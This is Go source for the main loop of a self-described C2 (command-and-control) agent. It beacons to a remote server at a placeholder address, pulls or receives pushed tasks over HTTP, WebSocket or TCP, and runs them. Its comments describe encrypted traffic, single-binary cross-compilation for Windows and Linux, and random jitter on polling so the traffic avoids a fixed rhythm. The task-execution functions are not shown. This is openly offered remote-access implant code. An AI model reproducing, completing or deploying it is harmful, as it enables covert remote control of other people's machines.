package main

import (
	"fmt"
	"math/rand"
	"os"
	"os/signal"
	"syscall"
	"time"
)

// Go 版 C2 Agent
// 与 client/agent.py 协议完全对齐: HTTP POST /agent/{heartbeat,pull,result}
// 加密通信: none/aes-128-cbc/aes-256-cbc/xor/rc4/chacha20
// 纯 Go (CGO_ENABLED=0) → 支持 GOOS=windows/linux 交叉编译，单二进制无依赖
//
// 三种通信模式:
//   http/https  - 轮询模式（定时 pull 任务，间隔 10s+抖动）
//   websocket   - 长连接模式（服务端主动推送任务，实时执行）
//   tcp         - 长连接模式（服务端主动推送任务，实时执行）
//
// 用法:
//   agent.exe -server http://1.2.3.4:5000 -enc-algo aes-256-cbc -enc-password "yourpass"
//   C2_SERVER=... C2_ENC_ALGO=... C2_ENC_PASSWORD=... ./agent
func main() {
	cfg = loadConfig()
	rand.Seed(time.Now().UnixNano())

	fmt.Printf("[*] C2 Agent (Go) Started - Client ID: %s\n", cfg.ClientID)
	fmt.Printf("[*] C2 Server: %s\n", cfg.C2Server)
	fmt.Printf("[*] EncAlgo: %s  Runtime: %s\n", cfg.EncAlgo, runtimeInfo())
	fmt.Printf("[*] Protocol: %s\n", cfg.Protocol)
	if cfg.Protocol == "websocket" {
		fmt.Println("[*] WebSocket mode: long-lived WS connection, auto-reconnect on disconnect")
	} else if cfg.Protocol == "tcp" {
		fmt.Printf("[*] TCP mode: long-lived TCP connection to port %s, auto-reconnect on disconnect\n", cfg.AgentTCPPort)
	}

	// 首次心跳
	heartbeat()

	// 信号处理: Ctrl+C 优雅退出
	stopCh := make(chan os.Signal, 1)
	signal.Notify(stopCh, syscall.SIGINT, syscall.SIGTERM)

	if cfg.Protocol == "websocket" || cfg.Protocol == "tcp" {
		// WS/TCP 长连接模式: 服务端主动推送任务，客户端阻塞等待
		runLongConnectionMode(stopCh)
	} else {
		// HTTP 模式: 定时轮询拉取任务
		runPollingMode(stopCh)
	}
}

// runLongConnectionMode WS/TCP 长连接模式
// 客户端阻塞等待服务端推送的任务消息，同时定时发送心跳维持连接
func runLongConnectionMode(stopCh chan os.Signal) {
	lastHeartbeat := time.Now()
	heartbeatTick := time.Duration(cfg.HeartbeatSec) * time.Second

	// 启动推送消息接收器（阻塞读取服务端推送）
	pushCh := make(chan []map[string]interface{}, 16)
	go func() {
		for {
			var tasks []map[string]interface{}
			if cfg.Protocol == "websocket" {
				tasks = receivePushedTasksWS()
			} else if cfg.Protocol == "tcp" {
				tasks = receivePushedTasksTCP()
			}
			if tasks == nil {
				// 连接断开，等待重连
				time.Sleep(2 * time.Second)
				// 重连后重新心跳
				heartbeat()
				continue
			}
			pushCh <- tasks
		}
	}()

	for {
		select {
		case <-stopCh:
			fmt.Println("\n[*] Exiting...")
			return
		case tasks := <-pushCh:
			// 收到服务端推送的任务，立即执行
			for _, t := range tasks {
				if tt, ok := t["task_type"].(string); ok {
					fmt.Printf("[*] Pushed task: %s\n", tt)
				}
				go processTask(t)
			}
		case <-time.After(5 * time.Second):
			// 定时心跳维持连接（5 秒检查一次，到点才发）
			if time.Since(lastHeartbeat) >= heartbeatTick {
				heartbeat()
				lastHeartbeat = time.Now()
			}
		}
	}
}

// runPollingMode HTTP 轮询模式
func runPollingMode(stopCh chan os.Signal) {
	lastHeartbeat := time.Now()
	heartbeatTick := time.Duration(cfg.HeartbeatSec) * time.Second
	pullTick := time.Duration(cfg.PullInterval) * time.Second

	for {
		// 随机抖动: pull 间隔加 0-50% 抖动，避免固定节奏
		jitterPull := pullTick + time.Duration(rand.Int63n(int64(pullTick/2)))
		select {
		case <-stopCh:
			fmt.Println("\n[*] Exiting...")
			return
		case <-time.After(jitterPull):
			tasks := pullTasks()
			for _, t := range tasks {
				if tt, ok := t["task_type"].(string); ok {
					fmt.Printf("[*] Processing task: %s\n", tt)
				}
				go processTask(t)
			}
			// 定时重新心跳（加 0-30% 抖动）
			jitterHeartbeat := heartbeatTick + time.Duration(rand.Int63n(int64(heartbeatTick/3)))
			if time.Since(lastHeartbeat) >= jitterHeartbeat {
				heartbeat()
				lastHeartbeat = time.Now()
			}
		}
	}
}
